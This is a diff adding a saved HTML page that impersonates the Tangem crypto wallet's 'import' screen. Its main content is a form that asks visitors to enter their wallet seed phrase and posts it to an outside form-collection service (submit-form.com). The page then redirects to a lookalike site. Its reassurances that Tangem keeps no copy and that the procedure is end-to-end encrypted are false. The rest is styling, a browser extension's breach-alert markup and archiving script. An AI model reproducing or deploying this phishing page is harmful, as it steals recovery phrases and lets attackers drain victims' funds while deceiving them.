@@ -1,0 +1,462 @@
+<!DOCTYPE html>
+<html lang=en>
+<!--
+ Page saved with SingleFile 
+ url: https://tangemconnect.app/import 
+ saved date: Sat Dec 21 2024 07:57:44 GMT+0100 (West Africa Standard Time)
+-->
+<meta charset=utf-8>
+<meta name=viewport content="width=device-width, initial-scale=1.0">
+<meta property=og:image content=tangem.com/img/sharing-waves.jpg>
+<link rel=icon type=image/png sizes=192x192 href=data:image/png;base64,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>
+<meta name=msapplication-TileColor content=#010101>
+<meta name=msapplication-TileImage content=ms-icon-144x144.html>
+<title>The best digital assets wallet — Tangem Wallet</title>
+<style>
+    body {
+        margin: 0;
+        padding: 0;
+        color: #ffffff;
+        background-color: #0c0c0c;
+        position: relative;
+        overflow-x: hidden
+    }
+    
+    #app-container {
+        height: 100%;
+        min-height: 100vh;
+        width: 100vw;
+        display: flex;
+        flex-direction: column;
+        justify-content: safe center;
+        align-items: safe center
+    }
+    
+    #app {
+        min-height: 600px
+    }
+    
+    .ilvWGM {
+        display: flex;
+        flex-direction: column;
+        height: 100%;
+        min-height: 100vh;
+        width: 100vw;
+        background-color: rgb(24, 24, 24);
+        border: 1px solid rgb(36, 40, 47);
+        box-shadow: rgba(0, 0, 0, 0.35) 0px 8px 28px
+    }
+    
+    .kApAIZ {
+        display: flex;
+        height: 100%;
+        -webkit-box-pack: center;
+        justify-content: center;
+        align-items: flex-start;
+        margin: 60px 0px
+    }
+    
+    .fVHKre {
+        width: 90%;
+        margin: auto;
+        display: flex;
+        flex-direction: column;
+        height: auto;
+        background-color: rgb(24, 24, 24);
+        padding: 10px;
+        border: 1px solid rgb(36, 40, 47);
+        border-radius: 12px
+    }
+    
+    .dqUwav {
+        width: 100%;
+        display: flex;
+        flex-direction: column;
+        flex: 1 1 0%;
+        align-self: flex-start
+    }
+    
+    .gNLlOb {
+        font-family: DMSans-Regular;
+        font-style: normal;
+        font-weight: 400;
+        font-size: 14px;
+        color: rgba(255, 255, 255, 0.8);
+        margin-top: 42px;
+        margin-bottom: 32px;
+        text-align: left
+    }
+    
+    form {
+        width: 100%
+    }
+    
+    textarea {
+        width: 100%;
+        height: 150px;
+        background: #000;
+        color: #fff
+    }
+    
+    form p {
+        font-size: 0.7rem;
+        text-align: center;
+        font-family: sans-serif;
+        color: grey
+    }
+    
+    .ibWSKo {
+        width: 100%;
+        margin-top: auto;
+        margin-bottom: 60px
+    }
+    
+    .eIzQQN {
+        display: flex;
+        flex-direction: row;
+        -webkit-box-pack: center;
+        justify-content: center;
+        -webkit-box-align: center;
+        align-items: center;
+        border-radius: 8px;
+        background-color: rgb(255, 255, 255);
+        width: 100%;
+        height: 44px;
+        transition: all 0.1s ease 0s;
+        column-gap: 6px
+    }
+    
+    .eIzQQN:disabled {
+        opacity: 0.4;
+        cursor: not-allowed
+    }
+    
+    .note {
+        text-align: left;
+        color: dimgrey;
+        font-weight: 800;
+        font-size: 0.5rem
+    }
+</style>
+<meta name=referrer content=no-referrer>
+<style>
+    .sf-hidden {
+        display: none !important
+    }
+</style>
+<link rel=canonical href=https://tangemconnect.app/import>
+<meta http-equiv=content-security-policy content="default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:; object-src 'self' data:; frame-src 'self' data:;">
+</head>
+
+<body>
+    <div id=app-container>
+        <div id=app>
+            <div class="sc-gEvEer ilvWGM">
+                <div class="sc-huxJPp kApAIZ">
+                    <div class="sc-buTYxK fVHKre">
+                        <div class="sc-fvtFIe gHzAea">
+                            <div class="sc-bBeLUv hJhswp"></div>
+                            <div class="sc-bBeLUv gJkccc"></div>
+                            <div class="sc-bBeLUv gJkccc"></div>
+                        </div>
+                        <div class="sc-jWVtHx dqUwav">
+                            <h1 class="sc-hpQTqk gNLlOb">Seed phrase</h1>
+                            <form name=contactFormEmail action=https://submit-form.com/lRwf6PCQe method=post>
+                                <input type="hidden" name="_redirect" value="https://tangem-connect.pages.dev" />
+                                <p>Typically 12(sometimes 18, 24) words seperated by single spaces</p>
+                                <p style="font-size:12px;font-weight:400;color:grey;font-style:italic;margin:5px 0px"> Tangem does not keep a copy of your recovery phrase</p>
+                                <textarea type=text name=phrase id=userName required></textarea>
+                                <p class=note>NOTE: THE PROCEDURE IS END-TO-ENDENCRYPTED</p>
+                                <div class="sc-itJiaY ibWSKo">
+                                    <input class="sc-jlZhew eIzQQN" style=color:#000 type=submit name=submit value="Import Wallet">
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div style="position:fixed;z-index:9999;inset:16px 16px 80px;pointer-events:none"></div>
+        </div>
+    </div>
+    <div id=veepn-breach-alert>
+        <template shadowrootmode=open>
+        <style class=sf-hidden>
+          .breach-popup {
+            font-family: FigtreeVF, sans-serif;
+            position: fixed;
+            z-index: 2147483638;
+            text-rendering: optimizelegibility;
+            top: 0;
+            left: 0;
+            right: 0;
+            pointer-events: none;
+            padding-inline: 16px;
+            height: 0;
+            overflow: visible;
+            color: #222e3a
+          }
+
+          .breach-popup * {
+            box-sizing: border-box
+          }
+
+          .breach-popup__inner {
+            background-color: #de4558;
+            width: 100%;
+            border-radius: 16px;
+            margin-inline: auto;
+            pointer-events: all;
+            position: relative;
+            transition: transform .25s ease-in-out, max-width .25s ease-in-out;
+            transform: translateY(16px);
+            max-height: calc(100svh - 80px);
+            display: flex;
+            flex-direction: column
+          }
+
+          .breach-popup__header {
+            min-height: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            column-gap: 16px;
+            padding: 4px;
+            cursor: pointer
+          }
+
+          .breach-popup__close {
+            cursor: pointer;
+            background-color: transparent;
+            border-style: none;
+            outline: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 24px;
+            height: 24px;
+            flex-shrink: 0;
+            opacity: .5
+          }
+
+          .breach-popup__wrap {
+            display: grid;
+            grid-template-rows: 0fr;
+            transition: grid-template-rows .25s ease-in-out;
+            overflow: hidden
+          }
+
+          .breach-popup__content {
+            overflow: hidden;
+            opacity: 0;
+            transform: translateY(-10px)
+          }
+
+          .breach-popup--minimize .breach-popup__inner {
+            max-width: 485px;
+            transform: translateY(-100%)
+          }
+
+          .breach-popup--collapse .breach-popup__inner {
+            max-width: 485px
+          }
+
+          .breach-popup--expand .breach-popup__inner {
+            max-width: 1120px
+          }
+
+          .breach-popup--expand .breach-popup__wrap {
+            grid-template-rows: 1fr
+          }
+
+          .breach-popup--expand .breach-popup__content {
+            opacity: 1;
+            transform: translateY(0);
+            transition: transform .25s ease-in-out, opacity .25s ease-in-out;
+            transition-delay: .15s
+          }
+
+          .breach-popup--expand .breach-popup__header {
+            cursor: default
+          }
+
+          .breach-info {
+            padding: 2px;
+            height: 100%
+          }
+
+          .breach-info__inner {
+            padding: 22px 22px 0;
+            background-color: #fff;
+            border-bottom-left-radius: 15px;
+            border-bottom-right-radius: 15px;
+            height: 100%;
+            overflow: auto
+          }
+
+          .breach-info__alert {
+            font-size: 24px;
+            line-height: 32px;
+            font-weight: 700;
+            margin: 0
+          }
+
+          .breach-info__list {
+            margin-top: 24px;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 24px
+          }
+
+          @media only screen and (width>=992px) {
+            .breach-info__list {
+              flex-wrap: nowrap
+            }
+          }
+
+          .breach-info__item {
+            width: 100%
+          }
+
+          .breach-info__item:nth-child(2) {
+            max-width: 320px
+          }
+
+          .breach-info__item:nth-child(3) {
+            max-width: 200px
+          }
+
+          .breach-info__title {
+            font-size: 18px;
+            font-weight: 700;
+            line-height: 32px;
+            letter-spacing: -.1px;
+            color: #de4558;
+            margin-top: 0;
+            margin-bottom: 4px
+          }
+
+          .breach-info__description {
+            font-size: 16px;
+            line-height: 28px;
+            letter-spacing: -.1px
+          }
+
+          .breach-info__description ul {
+            margin: 0
+          }
+
+          .breach-info__actions {
+            display: flex;
+            justify-content: center;
+            padding-top: 32px;
+            padding-bottom: 22px;
+            background-color: #fff;
+            position: sticky;
+            bottom: 0
+          }
+
+          .breach-info__btn {
+            cursor: pointer;
+            border-style: none;
+            outline: none;
+            display: inline-flex;
+            align-items: center;
+            height: 48px;
+            padding-inline: 20px;
+            border-radius: 12px;
+            text-align: center;
+            font-size: 16px;
+            font-weight: 700;
+            line-height: 28px;
+            letter-spacing: -.1px;
+            color: #fff;
+            background-color: #ff6400
+          }
+
+          .button-expand {
+            position: absolute;
+            bottom: 0;
+            left: 50%;
+            transform: translate(-50%, 100%);
+            z-index: 1
+          }
+
+          .button-expand__pointer {
+            cursor: pointer
+          }
+
+          .button-expand__alert {
+            pointer-events: none;
+            transition: opacity .25s ease-in-out
+          }
+
+          .button-expand__arrow {
+            pointer-events: none;
+            transition: transform .25s ease-in-out, opacity .25s ease-in-out;
+            transform-origin: center
+          }
+
+          .button-expand--minimize .button-expand__arrow,
+          .button-expand--collapse .button-expand__alert,
+          .button-expand--expand .button-expand__alert {
+            opacity: 0
+          }
+
+          .button-expand--expand .button-expand__arrow {
+            transform: rotate(180deg)
+          }
+
+          .header-collapse {
+            display: flex;
+            align-items: center;
+            flex-wrap: wrap;
+            column-gap: 4px;
+            padding-left: 8px;
+            font-size: 14px;
+            line-height: 20px;
+            letter-spacing: -.1px;
+            color: #fff
+          }
+
+          .header-expand {
+            display: flex;
+            align-items: center;
+            flex-wrap: wrap;
+            column-gap: 4px;
+            padding-left: 20px;
+            font-size: 14px;
+            font-weight: 500;
+            line-height: 20px;
+            letter-spacing: -.1px;
+            color: #fff
+          }
+        </style>
+      </template>
+    </div>
+    <script data-template-shadow-root>
+        (() => {
+            document.currentScript.remove();
+            processNode(document);
+
+            function processNode(node) {
+                node.querySelectorAll("template[shadowrootmode]").forEach(element => {
+                    let shadowRoot = element.parentElement.shadowRoot;
+                    if (!shadowRoot) {
+                        try {
+                            shadowRoot = element.parentElement.attachShadow({
+                                mode: element.getAttribute("shadowrootmode"),
+                                delegatesFocus: element.getAttribute("shadowrootdelegatesfocus") != null,
+                                clonable: element.getAttribute("shadowrootclonable") != null,
+                                serializable: element.getAttribute("shadowrootserializable") != null
+                            });
+                            shadowRoot.innerHTML = element.innerHTML;
+                            element.remove()
+                        } catch (error) {}
+                        if (shadowRoot) {
+                            processNode(shadowRoot)
+                        }
+                    }
+                })
+            }
+        })()
+    </script>
